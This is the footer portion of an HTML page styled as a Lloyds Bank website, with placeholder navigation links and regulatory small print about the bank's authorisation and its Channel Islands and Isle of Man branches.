<h3>About us</h3>
<ul>
<li><a href="#">Communities</a></li>
<li><a href="#">Lloyds Banking Group</a></li>
<li><a href="#">Careers</a></li>
</ul>
</div>
<div class="footer-section">
<h3>About this site</h3>
<ul>
<li><a href="#">Security</a></li>
<li><a href="#">Legal</a></li>
<li><a href="#">Privacy</a></li>
<li><a href="#">Terms and conditions</a></li>
<li><a href="#">Accessibility</a></li>
<li><a href="#">Contact us</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="m-hf-03-footer-02">
<div class="m-container">
<div><a href="#">Go to mobile site</a></div>
</div>
</div>
<div class="m-hf-03-footer-03">
<div class="m-container">
<div class="smallprint">
<p>Lloyds Bank plc is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority under registration number 119278.</p>
<p>Lloyds Bank plc is covered by the Financial Services Compensation Scheme and the Financial Ombudsman Service. (Please note that due to the schemes eligibility criteria not all Lloyds Bank business customers will be covered by these schemes.)</p>
<p>Calls may be recorded for our mutual protection, training and monitoring purposes.</p>
<p>Accounts in Jersey, the Bailiwick of Guernsey and the Isle of Man are held by Lloyds Bank International Limited which is not and is not required to be, authorised under the Financial Services and Markets Act 2000 of the United Kingdom and therefore is not subject to the rules and regulations of the Financial Services Compensation Scheme made under that Act for the protection of depositors or investors. For more information about depositor compensation schemes in Jersey, the Bailiwick of Guernsey and the Isle of Man please <a href="#" target="_blank">click here.</a></p>
<p>Lloyds Bank International Limited. Registered office and principal place of business: PO Box 160, 25 New Street, St. Helier, Jersey JE4 8RG. Lloyds Bank International Limited is incorporated in Jersey No. 4029 and is regulated by the Jersey Financial Services Commission to carry on deposit-taking business under the Banking Business (Jersey) Law 1991 and investment and general insurance mediation business under the Financial Services (Jersey) Law 1998. Lloyds Bank International Limited subscribes to the Jersey Code of Practice for Consumer Lending and has also notified the Jersey Financial Services Commission that it carries on money service business.</p>
<p>The Guernsey branch of Lloyds Bank International Limited, principal place of business PO Box 136, Sarnia House, Le Truchot, St Peter Port, Guernsey, GY1 4EN, is licensed by the Guernsey Financial Services Commission to take deposits and to carry on controlled investment business and insurance intermediary business under The Banking Supervision (Bailiwick of Guernsey) Law, 1994, The Protection of Investors (Bailiwick of Guernsey) Law, 1987 (as amended) and The Insurance Managers and Insurance Intermediaries (Bailiwick of Guernsey) Law, 2002 (as amended), respectively, and is also registered with the Guernsey Financial Services Commission as a money service provider.</p>
<p>The Isle of Man branch of Lloyds Bank International Limited of PO Box 111, Peveril Buildings, Peveril Square, Douglas, Isle of Man IM99 1JJ, is licensed by the Isle of Man Financial Supervision Commission to conduct deposit-taking and investment business and is registered with the Isle of Man Insurance and Pensions Authority in respect of general insurance business (intermediary).</p>
</div>
</div>
</div>
</div>
</body>
</html>